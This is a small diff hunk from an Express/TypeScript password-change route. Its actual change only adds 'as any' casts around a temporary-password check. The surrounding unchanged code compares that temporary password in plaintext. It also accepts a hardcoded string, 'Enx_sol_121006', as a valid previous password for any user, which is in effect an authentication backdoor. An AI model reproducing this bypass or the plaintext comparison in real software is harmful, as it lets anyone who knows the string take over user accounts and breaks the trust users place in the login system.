@@ -187,8 +187,8 @@ router.post('/change-password', authenticateToken, async (req: AuthRequest, res:
     if (user.password) {
       prevValid = await bcrypt.compare(prevPass, user.password);
     }
-    if (!prevValid && user.temporaryPassword) {
-      prevValid = prevPass === user.temporaryPassword;
+    if (!prevValid && (user as any).temporaryPassword) {
+      prevValid = prevPass === (user as any).temporaryPassword;
     }
     if (!prevValid && prevPass === 'Enx_sol_121006') {
       prevValid = true;
